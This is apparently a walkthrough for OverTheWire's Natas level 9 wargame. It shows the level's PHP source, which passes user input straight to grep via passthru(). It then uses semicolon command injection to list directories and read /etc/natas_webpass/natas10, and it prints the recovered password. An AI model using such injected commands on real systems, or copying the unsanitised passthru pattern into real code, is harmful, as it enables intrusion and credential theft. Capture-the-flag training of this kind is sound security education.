`Link` : `https://overthewire.org/wargames/natas/natas9.html`

## [𝐖𝐚𝐥𝐤𝐭𝐡𝐫𝐨𝐮𝐠𝐡] ~ 𝐍𝐚𝐭𝐚𝐬 𝐋𝐞𝐯𝐞𝐥 𝟖 - 𝐋𝐞𝐯𝐞𝐥 𝟗

## 𝐆𝐢𝐯𝐞𝐧

- Username: natas9
- URL:      `http://natas9.natas.labs.overthewire.org`


## 𝐒𝐨𝐥𝐮𝐭𝐢𝐨𝐧

- Visit:      `http://natas9.natas.labs.overthewire.org`
- `viewsource`

```
<body>
<h1>natas9</h1>
<div id="content">
<form>
Find words containing: <input name=needle><input type=submit name=submit value=Search><br><br>
</form>


Output:
<pre>
<?
$key = "";

if(array_key_exists("needle", $_REQUEST)) {
    $key = $_REQUEST["needle"];
}

if($key != "") {
    passthru("grep -i $key dictionary.txt");
}
?>
</pre>
```

- Notice: `passthru("grep -i $key dictionary.txt");`
- Means every single thing we input is passed as it is to `grep` without any sanitization
- Possible Php command injection
  - `; ls -la;` but nothing juicy found
  - `; cd ..;` - there is a folder named `natas10` but `; cd ..; cd natas10;` doesn't work
  - `; find / -name *natas*;` - find everything that has natas in it.

- `; find / -name *natas*;` - this gives us something very juicy!

<div align=center>
  <img src=https://user-images.githubusercontent.com/68887544/148765886-57f3d2b2-1cf3-46fa-8f0f-f50d2b9122b5.png width=500px>
</div>

- There folders contains user passwords.
- Let's try `; cat /etc/natas_webpass/natas10;`
- Boom!

<div align=center>
  <img src=https://user-images.githubusercontent.com/68887544/148766230-a1ae94ee-8021-47c0-a2de-3f13f618d873.png width=500px>
</div>

- `nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu`
